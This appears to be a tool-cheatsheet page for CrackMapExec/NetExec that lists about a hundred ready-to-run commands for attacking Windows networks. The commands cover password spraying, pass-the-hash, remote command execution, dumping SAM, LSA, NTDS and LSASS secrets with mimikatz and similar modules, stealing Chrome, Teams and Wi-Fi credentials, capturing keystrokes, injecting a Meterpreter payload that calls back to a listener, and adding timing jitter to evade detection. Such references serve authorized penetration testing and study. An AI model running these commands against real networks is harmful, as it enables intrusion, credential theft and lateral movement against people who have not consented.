# CrackMapExec / NetExec

> The Swiss-army knife for Windows networks: spray credentials, execute commands and dump secrets across SMB, WinRM, LDAP and MSSQL. NetExec (nxc) is the maintained fork.

- Category: Lateral Movement
- Commands: 100
- Page: https://terminal.rokibulroni.com/tool/lateral/crackmapexec
- Homepage: https://www.netexec.wiki
- Documentation: https://www.netexec.wiki
- Tags: Active Directory, SMB, lateral movement

## Install

- apt: `sudo apt install netexec`
- pipx: `pipx install git+https://github.com/Pennyw0rth/NetExec`

## Basic Syntax & Help

### crackmapexec -h

```bash
crackmapexec -h
```

Displays the main help menu and available protocol options

### crackmapexec smb -h

```bash
crackmapexec smb -h
```

Displays specific help and options for the SMB protocol module

### crackmapexec winrm -h

```bash
crackmapexec winrm -h
```

Displays specific help and options for the WinRM protocol module

### crackmapexec ssh -h

```bash
crackmapexec ssh -h
```

Displays specific help and options for the SSH protocol module

### crackmapexec ldap -h

```bash
crackmapexec ldap -h
```

Displays specific help and options for the LDAP protocol module

### crackmapexec mssql -h

```bash
crackmapexec mssql -h
```

Displays specific help and options for the MSSQL protocol module

### crackmapexec -L

```bash
crackmapexec -L
```

Lists all available modules that can be loaded

### crackmapexec smb --options

```bash
crackmapexec smb --options
```

Lists available options and their current settings for the SMB protocol


## Network Discovery

### crackmapexec smb 192.168.1.0/24

```bash
crackmapexec smb 192.168.1.0/24
```

Performs unauthenticated discovery of SMB hosts across a network range


## Authentication Testing

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jdoe' -p 'Password123!'
```

Tests SMB login with a single cleartext username and password

### crackmapexec smb 192.168.1.10 -u 'users.txt' -p 'passwords.txt'

```bash
crackmapexec smb 192.168.1.10 -u 'users.txt' -p 'passwords.txt'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt
```

Performs a credential spray using lists of usernames and passwords

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-auth

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-auth
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'admin' --local-auth
```

Authenticates against the local SAM database instead of the domain controller

### crackmapexec smb 192.168.1.10 -u 'user' -p ''

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p ''
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'guest' -p ''
```

Tests for null session or empty password access on the target

### crackmapexec smb 192.168.1.10 -u '' -p ''

```bash
crackmapexec smb 192.168.1.10 -u '' -p ''
```

Checks for anonymous authentication access to the target


## Pass-the-Hash

### crackmapexec smb 192.168.1.10 -u 'user' -H 'NTLM_HASH'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -H 'NTLM_HASH'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'
```

Authenticates using an NTLM hash instead of a cleartext password

### crackmapexec smb 192.168.1.10 -u 'user' -H 'NT_HASH'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -H 'NT_HASH'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -H '31d6cfe0d16ae931b73c59d7e0c089c0'
```

Authenticates using only the NT portion of the hash


## Kerberos Authentication

### crackmapexec smb 192.168.1.10 -k

```bash
crackmapexec smb 192.168.1.10 -k
```

Authenticates using an existing Kerberos ticket from the KRB5CCNAME environment variable

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -k

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -k
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jdoe' -p 'Password123' -k
```

Attempts to request a TGT and authenticate via Kerberos with supplied credentials

### crackmapexec smb 192.168.1.10 -u 'user' -H 'NTLM_HASH' -k

```bash
crackmapexec smb 192.168.1.10 -u 'user' -H 'NTLM_HASH' -k
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jdoe' -H '31d6cfe0d16ae931b73c59d7e0c089c0' -k
```

Requests a TGT using the RC4 key (NT hash) and authenticates via Kerberos

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --aesKey 'AES_KEY' -k

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --aesKey 'AES_KEY' -k
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'jdoe' -p 'pass' --aesKey 'AES256_KEY' -k
```

Authenticates via Kerberos using a specific AES256 key


## Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --shares

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --shares
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'guest' -p '' --shares
```

Lists available SMB shares and the user's access level (READ/WRITE)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sessions

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sessions
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --sessions
```

Enumerates active SMB sessions on the target host

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --disks

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --disks
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --disks
```

Lists the physical disks and logic drives mounted on the target

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --loggedon-users

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --loggedon-users
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --loggedon-users
```

Enumerates users currently logged on to the target system

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --users

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --users
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --users
```

Enumerates all domain users via the target's SAM or LSA

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --groups

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --groups
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --groups
```

Enumerates all domain groups available on the target

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-groups

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-groups
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --local-groups
```

Enumerates local groups defined specifically on the target machine

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --pass-pol

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --pass-pol
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --pass-pol
```

Retrieves the domain password policy (complexity, lockout, history)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rid-brute 1000

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rid-brute 1000
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'guest' -p '' --rid-brute 2000
```

Brute forces RIDs to map users and groups when standard enumeration fails


## Spidering

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --spider 'C$'
```

Spiders the C$ share listing all readable files and directories

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$' --regex 'pass'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$' --regex 'pass'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --spider 'C$' --regex 'password'
```

Spiders the share looking only for filenames matching a regex pattern

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$' --content

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --spider 'C$' --content
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --spider 'C$' --content
```

Searches inside file contents (not just filenames) during spidering

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M spider_plus

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M spider_plus
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M spider_plus
```

Uses the advanced spider_plus module to dump metadata and file listings to JSON


## WinRM Usage

### crackmapexec winrm 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec winrm 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec winrm 192.168.1.10 -u 'admin' -p 'password'
```

Checks if WinRM authentication is possible on the target

### crackmapexec winrm 192.168.1.10 -u 'user' -p 'password' -x 'whoami'

```bash
crackmapexec winrm 192.168.1.10 -u 'user' -p 'password' -x 'whoami'
```

Example:

```bash
crackmapexec winrm 192.168.1.10 -u 'admin' -p 'password' -x 'whoami'
```

Executes a command via WinRM (often quieter than SMB exec)

### crackmapexec winrm 192.168.1.10 -u 'user' -p 'password' -X 'Get-Process'

```bash
crackmapexec winrm 192.168.1.10 -u 'user' -p 'password' -X 'Get-Process'
```

Example:

```bash
crackmapexec winrm 192.168.1.10 -u 'admin' -p 'password' -X 'Get-Process'
```

Executes a PowerShell command directly via WinRM


## MSSQL Usage

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password'
```

Tests authentication against an MSSQL database instance

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' --local-auth

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' --local-auth
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password' --local-auth
```

Authenticates to MSSQL using a local database account

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' -q 'SELECT @@VERSION'

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' -q 'SELECT @@VERSION'
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password' -q 'SELECT @@VERSION'
```

Executes a SQL query against the target database

### crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' -x 'whoami'

```bash
crackmapexec mssql 192.168.1.10 -u 'user' -p 'password' -x 'whoami'
```

Example:

```bash
crackmapexec mssql 192.168.1.10 -u 'sa' -p 'password' -x 'whoami'
```

Attempts to execute system commands via xp_cmdshell on MSSQL


## LDAP Usage

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password'
```

Tests LDAP authentication against a Domain Controller

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --asreproast output.txt

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --asreproast output.txt
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --asreproast hashes.txt
```

Checks for AS-REP roasting vulnerabilities and saves hashes to a file

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --kerberoasting output.txt

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --kerberoasting output.txt
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --kerberoasting hashes.txt
```

Performs Kerberoasting against the domain and saves TGS hashes

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --trusted-for-delegation

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --trusted-for-delegation
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --trusted-for-delegation
```

Enumerates accounts trusted for unconstrained delegation

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --admin-count

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --admin-count
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'jdoe' -p 'password' --admin-count
```

Enumerates high-value users protected by the AdminSDHolder object


## Command Execution

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -x 'ipconfig /all'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -x 'ipconfig /all'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -x 'ipconfig /all'
```

Executes a command via cmd.exe on the target system

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -X '$PSVersionTable'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -X '$PSVersionTable'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -X '$PSVersionTable'
```

Executes a command via PowerShell on the target system

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method smbexec -x 'whoami'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method smbexec -x 'whoami'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method smbexec -x 'whoami'
```

Forces the execution method to use smbexec (creating a service) explicitly

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method wmiexec -x 'whoami'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method wmiexec -x 'whoami'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method wmiexec -x 'whoami'
```

Forces the execution method to use wmiexec (DCOM)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method atexec -x 'whoami'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method atexec -x 'whoami'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method atexec -x 'whoami'
```

Forces the execution method to use the Task Scheduler (atexec)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method mmcexec -x 'whoami'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --exec-method mmcexec -x 'whoami'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --exec-method mmcexec -x 'whoami'
```

Forces the execution method to use MMC (Microsoft Management Console)


## File Operations

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --put local_file remote_path

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --put local_file remote_path
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --put tool.exe C:\Windows\Temp\tool.exe
```

Uploads a file from the attacker machine to the target system

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --get remote_path local_file

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --get remote_path local_file
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --get C:\Windows\System32\drivers\etc\hosts ./hosts
```

Downloads a file from the target system to the attacker machine


## Credential Harvesting

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sam

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sam
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --sam
```

Dumps the SAM database to retrieve local account hashes (requires Admin)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --lsa

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --lsa
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --lsa
```

Dumps LSA secrets from the registry (requires Admin)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --ntds
```

Attempts to parse the NTDS.dit file on a Domain Controller using Volume Shadow Copy

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds vss

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds vss
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --ntds vss
```

Explicitly uses VSS method to dump NTDS.dit

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds drsuapi

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --ntds drsuapi
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' --ntds drsuapi
```

Uses the DRSUAPI replication protocol to dump domain hashes (DCSync)


## Modules - Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M enum_av

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M enum_av
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M enum_av
```

Uses a module to identify installed antivirus software on the target

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M wdigest -o ACTION=enable

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M wdigest -o ACTION=enable
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M wdigest -o ACTION=enable
```

Modifies registry settings to enable WDigest credential caching (requires reboot to take effect)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M uac

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M uac
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M uac
```

Checks UAC (User Account Control) configuration and status


## Modules - Credential Dumping

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M lsassy

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M lsassy
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M lsassy
```

Uses the lsassy module to remotely dump LSASS memory and extract credentials

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M nanodump

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M nanodump
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M nanodump
```

Uses the nanodump module to create a minidump of LSASS with minimal footprint

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M mimikatz

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M mimikatz
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M mimikatz
```

Executes Mimikatz commands directly on the target (less opsec safe)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M mimikatz -o COMMAND='sekurlsa::logonpasswords'
```

Runs a specific Mimikatz command via the module


## Modules - Vulnerability Scanning

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M zerologon

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M zerologon
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M zerologon
```

Checks if the target Domain Controller is vulnerable to ZeroLogon (CVE-2020-1472)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M petitpotam

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M petitpotam
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M petitpotam
```

Checks if the target is vulnerable to PetitPotam coercion

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M nopac

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M nopac
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M nopac
```

Checks for the NoPac vulnerability (CVE-2021-42278/42287)


## Modules - Post Exploitation

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M rdp -o ACTION=enable

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M rdp -o ACTION=enable
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M rdp -o ACTION=enable
```

Enables RDP on the target host by modifying registry keys

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M webdav

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M webdav
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'password' -M webdav
```

Checks if the WebClient service is running (useful for coercion attacks)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M gpp_password

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M gpp_password
```

Searches SYSVOL for Group Policy Preferences XML files containing decrypted passwords


## RDP Protocol

### crackmapexec rdp 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec rdp 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec rdp 192.168.1.10 -u 'admin' -p 'password'
```

Tests valid credentials against the RDP service

### crackmapexec rdp 192.168.1.10 -u 'user' -p 'password' --screenshot

```bash
crackmapexec rdp 192.168.1.10 -u 'user' -p 'password' --screenshot
```

Example:

```bash
crackmapexec rdp 192.168.1.10 -u 'admin' -p 'password' --screenshot
```

Takes a screenshot of the RDP login session if authentication succeeds


## Database Maintenance

### crackmapexec smb 192.168.1.0/24 --export targets.csv

```bash
crackmapexec smb 192.168.1.0/24 --export targets.csv
```

Exports the internal CME database of discovered hosts to a CSV file

### cme-db

```bash
cme-db
```

Launches the database viewer to manage workspaces and credentials manually


## Advanced Workflow

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --continue-on-success

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --continue-on-success
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'admin' -p 'pass' --continue-on-success
```

Continues testing credentials against other hosts even after a success

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --no-output

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --no-output
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --no-output
```

Suppresses output to stdout (useful for automated scripts)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --verbose

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --verbose
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --verbose
```

Enables verbose logging to see detailed protocol interaction and errors

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --gpo-list

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --gpo-list
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' --gpo-list
```

Lists Group Policy Objects applied to the machine

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M get_keystrokes

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M get_keystrokes
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M get_keystrokes
```

Attempts to capture keystrokes from the target user session


## SSH Protocol

### crackmapexec ssh 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec ssh 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec ssh 192.168.1.10 -u 'root' -p 'password'
```

Tests SSH authentication

### crackmapexec ssh 192.168.1.10 -u 'user' --key-file id_rsa

```bash
crackmapexec ssh 192.168.1.10 -u 'user' --key-file id_rsa
```

Example:

```bash
crackmapexec ssh 192.168.1.10 -u 'root' --key-file ~/.ssh/id_rsa
```

Authenticates to SSH using a private key file


## FTP Protocol

### crackmapexec ftp 192.168.1.10 -u 'user' -p 'password'

```bash
crackmapexec ftp 192.168.1.10 -u 'user' -p 'password'
```

Example:

```bash
crackmapexec ftp 192.168.1.10 -u 'ftpuser' -p 'password'
```

Tests authentication against an FTP server

### crackmapexec ftp 192.168.1.10 -u 'user' -p 'password' --ls

```bash
crackmapexec ftp 192.168.1.10 -u 'user' -p 'password' --ls
```

Example:

```bash
crackmapexec ftp 192.168.1.10 -u 'ftpuser' -p 'password' --ls
```

Lists files in the FTP root directory after authentication


## BloodHound Integration

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --bloodhound

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --bloodhound
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --bloodhound
```

Runs the BloodHound ingestor via LDAP to collect domain relationships

### crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --bloodhound -c All

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'password' --bloodhound -c All
```

Example:

```bash
crackmapexec ldap 192.168.1.10 -u 'user' -p 'pass' --bloodhound -c All
```

Collects all BloodHound data points (Sessions, LocalAdmins, etc)


## Password Policy

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --force-ps32

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --force-ps32
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --force-ps32
```

Forces PowerShell execution to use the 32-bit process


## Defensive Validation

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --jitter 5

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --jitter 5
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --jitter 5
```

Adds a random delay (jitter) between actions to evade simple timing detection

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sleep 10

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --sleep 10
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --sleep 10
```

Sleeps for a specific duration between hosts in a range scan


## Lateral Movement

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M met_inject -o LHOST=192.168.1.5 LPORT=4444

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M met_inject -o LHOST=192.168.1.5 LPORT=4444
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M met_inject -o LHOST=192.168.1.5 LPORT=4444
```

Injects a Meterpreter payload into memory (requires Listener)

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M slinky

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M slinky
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -M slinky
```

Creates LNK files on shares to harvest NTLMv2 hashes from users who browse them


## Enumeration

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --check-uac

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --check-uac
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --check-uac
```

Explicitly checks if UAC limits the administrative token

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --interface

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --interface
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --interface
```

Lists network interfaces on the remote host


## Module - Teams

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M teams_localdb

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M teams_localdb
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M teams_localdb
```

Parses local Microsoft Teams database for cookies and tokens


## Module - Chrome

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M chrome

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M chrome
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M chrome
```

Decrypts Chrome passwords and cookies (requires user session)


## Module - Wifi

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M wifi

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -M wifi
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'pass' -M wifi
```

Extracts saved Wi-Fi profiles and cleartext keys


## Cleanup

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rm local_file

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --rm local_file
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --rm C:\Windows\Temp\tool.exe
```

Deletes a specific file from the remote target

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -x 'taskkill /IM process.exe /F'

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' -x 'taskkill /IM process.exe /F'
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' -x 'taskkill /IM agent.exe /F'
```

Forcefully kills a running process to clean up execution artifacts


## Automation

### crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --continue-on-success --log cme.log

```bash
crackmapexec smb 192.168.1.0/24 -u 'user' -p 'password' --continue-on-success --log cme.log
```

Example:

```bash
crackmapexec smb 192.168.1.0/24 -u 'admin' -p 'pass' --continue-on-success --log cme.log
```

Runs a sweep and logs all output to a file for later analysis


## Final

### crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-auth --sam --lsa --ntds

```bash
crackmapexec smb 192.168.1.10 -u 'user' -p 'password' --local-auth --sam --lsa --ntds
```

Example:

```bash
crackmapexec smb 192.168.1.10 -u 'admin' -p 'pass' --local-auth --sam --lsa --ntds
```

Combines multiple dumping flags in a single execution for efficiency

## Related tools

- [CrackMapExec (enumeration)](https://terminal.rokibulroni.com/tool/enumeration/crackmapexec-enum)
- [Evil-WinRM](https://terminal.rokibulroni.com/tool/lateral/evil-winrm)
- [Impacket](https://terminal.rokibulroni.com/tool/active-directory/impacket)
- [BloodHound.py](https://terminal.rokibulroni.com/tool/active-directory/bloodhound-python)
